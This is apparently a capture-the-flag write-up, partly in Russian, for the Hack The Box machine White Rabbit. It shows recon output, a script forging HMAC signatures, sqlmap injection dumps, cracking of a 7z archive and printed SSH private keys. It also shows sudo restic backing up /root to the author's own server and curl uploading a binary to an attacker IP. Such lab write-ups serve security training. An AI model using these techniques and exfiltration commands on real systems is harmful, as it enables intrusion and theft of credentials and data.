## [white-rabbit.htb](https://app.hackthebox.com/machines/WhiteRabbit)

### --USER FLAG--

Scanning

```
Hexada@hexada ~/Downloads$ sudo nmap -sS -sC -sV -p- -T5 --max-rate 10000 whiterabbit.htb                                                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 17:54 EEST
Warning: 10.10.11.63 giving up on port because retransmission cap hit (2).
Nmap scan report for whiterabbit.htb (10.10.11.63)
Host is up (0.20s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: White Rabbit - Pentesting Services
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 559.42 seconds
```

```
Hexada@hexada ~/pentest-env/pentesting-wordlists$ ffuf -w ./SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://whiterabbit.htb -H "Host:FUZZ.whiterabbit.htb" -mc 200,302 -fs 0 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://whiterabbit.htb
 :: Wordlist         : FUZZ: /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,302
 :: Filter           : Response size: 0
________________________________________________

status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 147ms]
```
Поддомен возвращает статус реридекта, нужно посмотреть куда именно он нас направляет

```
Hexada@hexada ~/pentest-env/pentesting-wordlists$ curl -I -H "Host: status.whiterabbit.htb" http://whiterabbit.htb                                                            
HTTP/1.1 302 Found
Content-Length: 32
Content-Type: text/plain; charset=utf-8
Date: Wed, 09 Jul 2025 21:08:17 GMT
Location: /dashboard
Server: Caddy
Vary: Accept
X-Frame-Options: SAMEORIGIN
```

В директорию `status.whiterabbit.htb/dashboard`

![image](https://github.com/user-attachments/assets/a6cb4d1d-5422-464f-95d1-2f3bafa7e24e)

+ новый поддомен: `status.whiterabbit.htb`

```
Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts                                                                                                              
# Static table lookup for hostnames.
# See hosts(5) for details.

127.0.0.1       localhost
::1             localhost
127.0.0.1       hexada.localdomain    hexada
10.10.11.63     status.whiterabbit.htb    whiterabbit.htb
```

![image](https://github.com/user-attachments/assets/c4c27cbc-130b-4319-ab5f-561cf0fa8db9)

```
Hexada@hexada ~/pentest-env/pentesting-wordlists$ ffuf -u http://status.whiterabbit.htb/FUZZ -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.js,.json,.txt -fs 2444 -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/FUZZ
 :: Wordlist         : FUZZ: /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .html .js .json .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2444
________________________________________________

                        [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 127ms]
screenshots             [Status: 301, Size: 189, Words: 7, Lines: 11, Duration: 61ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 60ms]
upload                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 61ms]
robots.txt              [Status: 200, Size: 25, Words: 3, Lines: 2, Duration: 188ms]
Screenshots             [Status: 301, Size: 189, Words: 7, Lines: 11, Duration: 60ms]
metrics                 [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
Upload                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 113ms]
ScreenShots             [Status: 301, Size: 189, Words: 7, Lines: 11, Duration: 94ms]
Robots.txt              [Status: 200, Size: 25, Words: 3, Lines: 2, Duration: 142ms]
                        [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 97ms]
manifest.json           [Status: 200, Size: 415, Words: 147, Lines: 20, Duration: 69ms]
```

```
Hexada@hexada ~/pentest-env/pentesting-wordlists$ curl -I  http://status.whiterabbit.htb/.well-known/change-password                                                          
HTTP/1.1 302 Found
Content-Length: 89
Content-Type: text/plain; charset=utf-8
Date: Wed, 09 Jul 2025 21:30:32 GMT
Location: https://github.com/louislam/uptime-kuma/wiki/Reset-Password-via-CLI
Server: Caddy
Vary: Accept
X-Frame-Options: SAMEORIGIN
```

При удалённом доступе может быть полезно

```
Bootstrap	5.1.3	  November 2021
vue-i18n	9.2.2	  January 2022
Font Awesome	5.15.4	  October 2021
vue-router	4.0.16	  January 2022
SortableJS	1.14.0	  December 2021
```

Приблизительная версия `Uptime Kuma v1.10–1.14`

https://cvefeed.io/vuln/detail/CVE-2024-56331
https://github.com/advisories/GHSA-2qgm-m29m-cj2h

Может сработать только, если есть доступ к системе, потенциально возможно через сброс пароля: `npm run reset-password`

```
Hexada@hexada ~/pentest-env/pentesting-wordlists$ ffuf -u http://status.whiterabbit.htb/status/FUZZ -w ./SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.js,.json,.txt.,xslx,.csv,.bak,.old,.zip,.tar,.gz,.env,.log,.conf -mc 200-299,301,302,307,401,403,404,405,500 -fs 2444 -ic -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/status/FUZZ
 :: Wordlist         : FUZZ: /home/Hexada/pentest-env/pentesting-wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .html .js .json .txt. xslx .csv .bak .old .zip .tar .gz .env .log .conf 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,404,405,500
 :: Filter           : Response size: 2444
________________________________________________

temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 86ms]
```

`/status` — это публичная страница, которая предназначена для отображения состояния сервисов (мониторов), которые админ выбрал как "доступные публично"

https://github.com/louislam/uptime-kuma/wiki/Status-Page

<img width="1920" height="949" alt="image" src="https://github.com/user-attachments/assets/6f14c7b3-9f96-4b2c-8d03-a4cd6529da2f" />

+ новый поддомены: `ddb09a8558c9.whiterabbit.htb`, `a668910b5514e.whiterabbit.htb`

```
Hexada@hexada ~/pentest-env/pentesting-wordlists$ cat /etc/hosts                                                                                                                           
# Static table lookup for hostnames.
# See hosts(5) for details.

127.0.0.1       localhost
::1             localhost
127.0.0.1       hexada.localdomain    hexada
192.168.0.101   cyberia
10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb
```

<img width="1920" height="653" alt="image" src="https://github.com/user-attachments/assets/a03061b4-308a-4f2e-b43e-181b9fdee320" />

<img width="983" height="495" alt="image" src="https://github.com/user-attachments/assets/f69b38e1-fddb-475a-86f5-422d5856cd06" />
 
 + новый поддомен: `28efa8f7df.whiterabbit.htb`

```
Hexada@hexada ~/Downloads$ cat /etc/hosts                                                                                                                                                  
# Static table lookup for hostnames.
# See hosts(5) for details.

127.0.0.1       localhost
::1             localhost
127.0.0.1       hexada.localdomain    hexada
192.168.0.101   cyberia
10.10.11.63     status.whiterabbit.htb   whiterabbit.htb   ddb09a8558c9.whiterabbit.htb   a668910b5514e.whiterabbit.htb    28efa8f7df.whiterabbit.htb
```

<img width="1916" height="755" alt="image" src="https://github.com/user-attachments/assets/45c71214-bddf-4447-9995-be8b333d270f" />


`x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd`

Это `HMAC` подпись, которая проверяет не подделал ли кто-то запрос. Идея следуйщая: на сервере храниться секрет, перед тем как обработать запрос, сервер
сначала хеширует `body` HTTP запроса, и потом сравнивает его с значением захешированого body на клиенте в `sha256=...`, если хеши совпадают - запрос валиден,
если нет - запрос не валиден. Если у нас получиться достать секрет, мы можем подделать `HMAC` подпись, и сделать все наши запросы валидными.

<img width="1280" height="295" alt="image" src="https://github.com/user-attachments/assets/1d5bcd3d-0eab-4b90-855f-087d9ad5b6c2" />

<img width="1280" height="295" alt="image" src="https://github.com/user-attachments/assets/b1523419-14ed-4224-9bb4-65c76777c5f3" />

Обратите внимание, как только мы изменяем body http запроса, он сразу же становиться не валидным, так как наш хеш в `Wiki.js`: 
`cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd` - это захешированный тестовый body, секретом, который нам нужно достать

Также обратите внимание, что мы можем посмотреть содержание файла `gophish_to_phishing_score_database.json`, в котором мы можем найти нужный нам хеш

```json
{
        "parameters": {
          "action": "hmac",
          "type": "SHA256",
          "value": "={{ JSON.stringify($json.body) }}",
          "dataPropertyName": "calculated_signature",
          "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
        },
        "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
        "name": "Calculate the signature",
        "type": "n8n-nodes-base.crypto",
        "typeVersion": 1,
        "position": [
          860,
          340
        ]
      }
```

По мимо этого, мы можем здесь найти еще пару очень интересный вещей

```json
{
        "parameters": {
          "operation": "executeQuery",
          "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
          "options": {}
        },
        "id": "5929bf85-d38b-4fdd-ae76-f0a61e2cef55",
        "name": "Get current phishing score",
        "type": "n8n-nodes-base.mySql",
        "typeVersion": 2.4,
        "position": [
          1380,
          260
        ],
        "alwaysOutputData": true,
        "retryOnFail": false,
        "executeOnce": false,
        "notesInFlow": false,
        "credentials": {
          "mySql": {
            "id": "qEqs6Hx9HRmSTg5v",
            "name": "mariadb - phishing"
          }
        }
      }
```

Поле `email` не экранируеться, соответственно, скорей всего, там есть SQL инъекция, но есть одна небольшая проблема: `LIMIT 1`, это небольшая проблема, потому 
что её можно обойти

В SQL `LIMIT` управляет количеством строк, которые вернёт запрос, в данном случае у нас SQL может вернуть только одну строку, поэтому класические вредоносные
payload тут не будут работать. Место того, чтоб пытаться подбирать самостоятельно эти запросы, лучше будет использовать `SQLmap`, для этого, нам нужно написать 
скрипт, который подделывать `HMAC` подпись: мы перехвачиваем запрос от `SQLmap`, хешируем его `body` с помощью нашего секрета, в `head` передаем этот хеш в параметр 
x-gophish-signature, и потом уже отправляем запрос

<img width="1280" height="520" alt="image" src="https://github.com/user-attachments/assets/cabdf99d-9ffc-4c61-842b-c95395110bd6" />

Рекомендую разобраться с документацией в `http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks`, и как это все работает под капотом

```py
from mitmproxy import http
import json
import hmac
import hashlib

SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

def request(flow: http.HTTPFlow):
    if flow.request.path.startswith("/webhook/") and flow.request.method == "POST":
        try:
            raw_data = flow.request.get_content()
            signature = hmac.new(SECRET, raw_data, hashlib.sha256).hexdigest()
            flow.request.headers["x-gophish-signature"] = f"sha256={signature}"
        except Exception as e:
            flow.request.headers["x-gophish-signature"] = "error-signing"
```

```
(lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \          1 ↵ master 
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  --proxy="http://127.0.0.1:1717" \
  --technique=BE --time-sec=3 --dbs

---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: {"campaign_id":1,"email":"" RLIKE (SELECT (CASE WHEN (7681=7681) THEN '' ELSE 0x28 END))-- TjUm","message":"Clicked Link"}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"campaign_id":1,"email":"" AND (SELECT 8200 FROM(SELECT COUNT(*),CONCAT(0x71706a6a71,(SELECT (ELT(8200=8200,1))),0x7178716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FkoX","message":"Clicked Link"}
---
[20:14:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:14:28] [INFO] fetching database names
[20:14:29] [INFO] retrieved: 'information_schema'
[20:14:29] [INFO] retrieved: 'phishing'
[20:14:30] [INFO] retrieved: 'temp'
available databases [3]:
[*] information_schema
[*] phishing
[*] temp
```

```
(lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \              master 
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  --proxy="http://127.0.0.1:1717" \
  -D temp --tables command_log 


[20:18:39] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:18:39] [INFO] fetching tables for database: 'temp'
[20:18:39] [INFO] resumed: 'command_log'
Database: temp
[1 table]
+-------------+
| command_log |
+-------------+
```

```
(lab-env) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d" \              master 
  --data='{"campaign_id":1,"email":"*","message":"Clicked Link"}' \
  --headers="Content-Type: application/json" \
  --proxy="http://127.0.0.1:1717" \
  -D temp -T command_log --dump 

Database: temp
Table: command_log
[6 entries]
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

+ новый поддомен: `http://75951e6ff.whiterabbit.htb`

[restic](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#local)

```
Hexada@hexada ~/Downloads$ restic -r rest:http://75951e6ff.whiterabbit.htb snapshots                                                                                                       
enter password for repository: 
repository 5b26a938 opened (version 2, compression level auto)
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-07 02:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots

echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd

Hexada@hexada ~$ restic -r rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd restore 272cacd5 -t .                                                                      
repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to .
Summary: Restored 5 files/dirs (572 B) in 0:00

Hexada@hexada ~/dev/shm/bob/ssh$ ls                                                                                                                                                        
bob.7z
```

```
Hexada@hexada ~/dev/shm/bob/ssh$ 7z x bob.7z                                                                                                                                          7 ↵  

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password:ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw

ERROR: Data Error in encrypted file. Wrong password? : bob
ERROR: Data Error in encrypted file. Wrong password? : bob.pub
ERROR: Data Error in encrypted file. Wrong password? : config
             
Sub items Errors: 3

Archives with Errors: 1

Sub items Errors: 3
```

```
Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ 7z2john dev/shm/bob/ssh/bob.7z > bob.hash

Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ cat bob.hash                                                                                                                             
bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00
```

```
Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb$ john --wordlist=/home/Hexada/pentest-env/pentesting-wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt bob.hash                   
Warning: detected hash type "7z", but the string is also recognized as "7z-opencl"
Use the "--format=7z-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip [SHA256 128/128 AVX 4x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1q2w3e4r5t6y     (bob.7z)
1g 0:00:07:33 DONE (2025-08-21 18:44) 0.002204g/s 52.55p/s 52.55c/s 52.55C/s 230891..150388
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ 7z x bob.7z                                                                                                              

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:8 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password:1q2w3e4r5t6y

Everything is Ok

Files: 3
Size:       557
Compressed: 572
Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ ls                                                                                                                       
bob  bob.7z  bob.pub  config
```

```
Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ cat config                                                                                                               
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob

Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ cat bob                                                                                                                  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----

Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/bob/ssh$ ssh -i bob -p 2222 bob@whiterabbit.htb                                                                                   
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Aug 21 15:29:06 2025 from 10.10.14.42
bob@ebdce80611e9:~$ 
```

```
bob@ebdce80611e9:~$ sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

```
Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm$ mkdir root-repo

Hexada@hexada ~/app/rest-server/cmd/rest-server$ ./rest-server --path /home/Hexada/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo --no-auth --listen :1717             130 ↵  ✭master 
Data directory: /home/Hexada/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo
Authentication disabled
Append only mode disabled
Private repositories disabled
Group accessible repos disabled
start server on [::]:1717
```

```
echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd

sudo /usr/bin/restic -r rest:http://10.10.16.43:1717/root-repo init --password-file .restic_passwd

sudo /usr/bin/restic -r rest:http://10.10.16.43:1717/root-repo backup /root --password-file .restic_passwd
```

```
Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo$ restic -r . --password-file ../.restic_passwd snapshots                                                                
repository 4c4a8aae opened (version 2, compression level auto)
created new cache in /home/Hexada/.cache/restic
ID        Time                 Host          Tags        Paths
--------------------------------------------------------------
aa0caae4  2025-08-22 20:35:00  ebdce80611e9              /root
--------------------------------------------------------------
1 snapshots

Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo$ restic -r . --password-file ../.restic_passwd restore latest --target ./restored_root-repo                             
repository 4c4a8aae opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
restoring snapshot aa0caae4 of [/root] at 2025-08-22 17:35:00.231996391 +0000 UTC by root@ebdce80611e9 to ./restored_root-repo
Summary: Restored 8 files/dirs (3.865 KiB) in 0:00

Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo/restored_root-repo/root$ ls                                                                                             
morpheus  morpheus.pub
Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo/restored_root-repo/root$ cat morpheus                                                                                   
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----

Hexada@hexada ~/pentest-env/vrm/white.rabbit.htb/dev/shm/root-repo/restored_root-repo/root$ ssh -i morpheus morpheus@whiterabbit.htb                                                       
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 22 17:59:22 2025 from 10.10.16.43
morpheus@whiterabbit:~$ ls
user.txt
```

### --ROOT FLAG--

```
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

It was run as root (because only root can reset passwords without being prompted for the old one)

```
morpheus@whiterabbit:/opt$ ls
containerd  docker  neo-password-generator
```

<img width="1920" height="299" alt="image" src="https://github.com/user-attachments/assets/a3eb8907-ad08-49bf-b692-d7d50424729a" />

```py
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def upload_file():
    file = request.files.get('file')
    if file:
        file.save(file.filename)

    return None, 400

if __name__ == '__main__':
    app.run(host='10.10.16.43', port=1818)
```

```
morpheus@whiterabbit:/opt/neo-password-generator$ cp neo-password-generator ~/neo-password-generator

curl -F "file=@neo-password-generator" http://10.10.16.43:1818/
```


